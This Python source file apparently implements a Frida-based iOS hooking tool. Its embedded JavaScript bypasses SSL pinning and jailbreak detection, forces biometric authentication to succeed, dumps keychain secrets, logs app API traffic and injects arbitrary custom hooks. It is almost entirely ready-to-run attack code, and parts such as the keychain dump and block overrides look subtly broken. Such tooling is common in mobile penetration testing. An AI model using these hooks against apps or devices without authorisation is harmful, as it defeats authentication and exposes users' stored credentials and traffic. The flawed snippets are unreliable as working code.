"""
iOS Runtime Hooking with Frida

Capabilities:
- SSL certificate pinning bypass
- Jailbreak detection bypass
- Biometric auth hooking (Face ID/Touch ID)
- Keychain dumping
- API call monitoring
- Custom hook injection
"""

import frida
import time
from typing import Dict, List, Optional


class iOSFridaHooker:
    """Runtime hooking for iOS applications using Frida"""

    def __init__(self, device_id: Optional[str] = None):
        """
        Connect to iOS device via USB or WiFi

        Args:
            device_id: Optional device ID. If None, uses USB device.
        """
        try:
            if device_id:
                self.device = frida.get_device(device_id)
            else:
                self.device = frida.get_usb_device()

            print(f"[+] Connected to device: {self.device.name}")

        except Exception as e:
            print(f"[!] Failed to connect to device: {e}")
            print("[*] Make sure iOS device is connected and Frida server is running")
            self.device = None

    def hook_ssl_pinning(self, bundle_id: str) -> bool:
        """
        Bypass SSL certificate pinning

        Hooks:
        - NSURLSession SSL verification
        - CFNetwork SSL verification
        - SecTrustEvaluate

        Args:
            bundle_id: App bundle ID (e.g., "com.example.app")

        Returns:
            True if bypass successful
        """
        if not self.device:
            return False

        hook_script = """
        // Hook NSURLSession SSL verification
        var NSURLSession = ObjC.classes.NSURLSession;
        if (NSURLSession) {
            Interceptor.attach(
                NSURLSession['- URLSession:didReceiveChallenge:completionHandler:'].implementation,
                {
                    onEnter: function(args) {
                        console.log('[*] SSL verification intercepted');

                        // Force trust
                        var completionHandler = new ObjC.Block(args[4]);
                        completionHandler.implementation = function(disposition, credential) {
                            console.log('[+] Forcing NSURLSessionAuthChallengeUseCredential');
                            var NSURLSessionAuthChallengeUseCredential = 0;
                            var credential = ObjC.classes.NSURLCredential.credentialForTrust_(args[3]);
                            completionHandler(NSURLSessionAuthChallengeUseCredential, credential);
                        };
                    }
                }
            );
        }

        // Hook SecTrustEvaluate
        var SecTrustEvaluate = Module.findExportByName('Security', 'SecTrustEvaluate');
        if (SecTrustEvaluate) {
            Interceptor.replace(SecTrustEvaluate, new NativeCallback(function(trust, result) {
                console.log('[+] SecTrustEvaluate bypassed - returning success');
                Memory.writeU8(result, 1); // kSecTrustResultProceed
                return 0; // errSecSuccess
            }, 'int', ['pointer', 'pointer']));
        }

        console.log('[+] SSL pinning bypass active');
        """

        try:
            session = self.device.attach(bundle_id)
            script = session.create_script(hook_script)
            script.load()

            print(f"[+] SSL pinning bypass active for {bundle_id}")
            return True

        except Exception as e:
            print(f"[!] SSL pinning bypass failed: {e}")
            return False

    def hook_jailbreak_detection(self, bundle_id: str) -> bool:
        """
        Bypass jailbreak detection

        Hooks common detection methods:
        - File existence checks (Cydia, /bin/bash, etc.)
        - fork() tests
        - stat() checks
        - canOpenURL() checks

        Args:
            bundle_id: App bundle ID

        Returns:
            True if bypass successful
        """
        if not self.device:
            return False

        hook_script = """
        // Hook file existence checks
        var NSFileManager = ObjC.classes.NSFileManager;
        if (NSFileManager) {
            Interceptor.attach(
                NSFileManager['- fileExistsAtPath:'].implementation,
                {
                    onEnter: function(args) {
                        var path = ObjC.Object(args[2]).toString();

                        // Jailbreak-related paths
                        var jbPaths = [
                            '/Applications/Cydia.app',
                            '/bin/bash',
                            '/usr/sbin/sshd',
                            '/etc/apt',
                            '/private/var/lib/apt'
                        ];

                        if (jbPaths.some(p => path.includes(p))) {
                            console.log('[+] Blocked jailbreak detection for: ' + path);
                            args[2] = ObjC.classes.NSString.stringWithString_('/nonexistent');
                        }
                    }
                }
            );
        }

        // Hook fork()
        var fork = Module.findExportByName(null, 'fork');
        if (fork) {
            Interceptor.replace(fork, new NativeCallback(function() {
                console.log('[+] fork() bypassed - returning -1');
                return -1; // Fork fails on jailbroken devices
            }, 'int', []));
        }

        // Hook canOpenURL (checks for Cydia URL scheme)
        var UIApplication = ObjC.classes.UIApplication;
        if (UIApplication) {
            Interceptor.attach(
                UIApplication['- canOpenURL:'].implementation,
                {
                    onEnter: function(args) {
                        var url = ObjC.Object(args[2]).toString();
                        if (url.includes('cydia://')) {
                            console.log('[+] Blocked Cydia URL check');
                            args[2] = ObjC.classes.NSURL.URLWithString_('http://safe.com');
                        }
                    }
                }
            );
        }

        console.log('[+] Jailbreak detection bypass active');
        """

        try:
            session = self.device.attach(bundle_id)
            script = session.create_script(hook_script)
            script.load()

            print(f"[+] Jailbreak detection bypass active for {bundle_id}")
            return True

        except Exception as e:
            print(f"[!] Jailbreak detection bypass failed: {e}")
            return False

    def hook_biometric_auth(self, bundle_id: str):
        """
        Hook biometric authentication (Face ID/Touch ID)

        Hooks LAContext evaluatePolicy to force success

        Args:
            bundle_id: App bundle ID
        """
        if not self.device:
            return

        hook_script = """
        // Hook LAContext evaluatePolicy
        var LAContext = ObjC.classes.LAContext;
        if (LAContext) {
            Interceptor.attach(
                LAContext['- evaluatePolicy:localizedReason:reply:'].implementation,
                {
                    onEnter: function(args) {
                        console.log('[*] Biometric auth intercepted');

                        // Force success callback
                        var reply = new ObjC.Block(args[4]);
                        reply.implementation = function(success, error) {
                            console.log('[+] Forcing biometric auth success');
                            reply(true, null); // Success, no error
                        };
                    }
                }
            );
        }

        console.log('[+] Biometric auth bypass active');
        """

        try:
            session = self.device.attach(bundle_id)
            script = session.create_script(hook_script)
            script.load()

            print(f"[+] Biometric auth bypass active for {bundle_id}")

        except Exception as e:
            print(f"[!] Biometric auth bypass failed: {e}")

    def dump_keychain(self, bundle_id: str) -> Dict:
        """
        Extract app's keychain items

        Hooks SecItemCopyMatching to dump accessible keychain items

        Args:
            bundle_id: App bundle ID

        Returns:
            Dictionary of keychain items
        """
        if not self.device:
            return {}

        hook_script = """
        rpc.exports = {
            dumpKeychain: function() {
                var items = [];

                // Query all keychain items
                var query = ObjC.classes.NSMutableDictionary.alloc().init();
                query.setObject_forKey_(ObjC.classes.kSecClassGenericPassword, ObjC.classes.kSecClass);
                query.setObject_forKey_(ObjC.classes.kSecMatchLimitAll, ObjC.classes.kSecMatchLimit);
                query.setObject_forKey_(true, ObjC.classes.kSecReturnAttributes);
                query.setObject_forKey_(true, ObjC.classes.kSecReturnData);

                var result = Memory.alloc(Process.pointerSize);
                var status = Security.SecItemCopyMatching(query, result);

                if (status == 0) {
                    var results = new ObjC.Object(Memory.readPointer(result));
                    for (var i = 0; i < results.count(); i++) {
                        var item = results.objectAtIndex_(i);
                        items.push({
                            account: item.objectForKey_('acct').toString(),
                            service: item.objectForKey_('svce').toString(),
                            data: item.objectForKey_('v_Data').base64EncodedStringWithOptions_(0).toString()
                        });
                    }
                }

                return {items: items, count: items.length};
            }
        };
        """

        try:
            session = self.device.attach(bundle_id)
            script = session.create_script(hook_script)
            script.load()

            keychain = script.exports.dump_keychain()
            print(f"[+] Dumped {keychain['count']} keychain items")

            return keychain

        except Exception as e:
            print(f"[!] Keychain dump failed: {e}")
            return {}

    def monitor_api_calls(self, bundle_id: str, duration: int = 30) -> List[Dict]:
        """
        Monitor all API calls made by app

        Hooks NSURLSession dataTaskWithRequest to log requests/responses

        Args:
            bundle_id: App bundle ID
            duration: Monitoring duration in seconds

        Returns:
            List of API call dictionaries
        """
        if not self.device:
            return []

        api_calls = []

        def on_message(message, data):
            if message['type'] == 'send':
                api_calls.append(message['payload'])

        hook_script = """
        // Hook NSURLSession dataTaskWithRequest
        var NSURLSession = ObjC.classes.NSURLSession;
        if (NSURLSession) {
            Interceptor.attach(
                NSURLSession['- dataTaskWithRequest:completionHandler:'].implementation,
                {
                    onEnter: function(args) {
                        var request = ObjC.Object(args[2]);
                        var url = request.URL().absoluteString().toString();
                        var method = request.HTTPMethod().toString();
                        var headers = request.allHTTPHeaderFields();

                        send({
                            type: 'request',
                            url: url,
                            method: method,
                            headers: headers ? headers.toString() : '',
                            timestamp: new Date().toISOString()
                        });
                    }
                }
            );
        }
        """

        try:
            session = self.device.attach(bundle_id)
            script = session.create_script(hook_script)
            script.on('message', on_message)
            script.load()

            print(f"[*] Monitoring API calls for {duration} seconds...")
            time.sleep(duration)

            print(f"[+] Captured {len(api_calls)} API calls")
            return api_calls

        except Exception as e:
            print(f"[!] API monitoring failed: {e}")
            return []

    def inject_custom_hook(self, bundle_id: str, hook_script: str):
        """
        Inject custom Frida JavaScript hook

        Args:
            bundle_id: App bundle ID
            hook_script: Custom Frida JavaScript code
        """
        if not self.device:
            return

        try:
            session = self.device.attach(bundle_id)
            script = session.create_script(hook_script)
            script.load()

            print(f"[+] Custom hook injected into {bundle_id}")

        except Exception as e:
            print(f"[!] Custom hook injection failed: {e}")
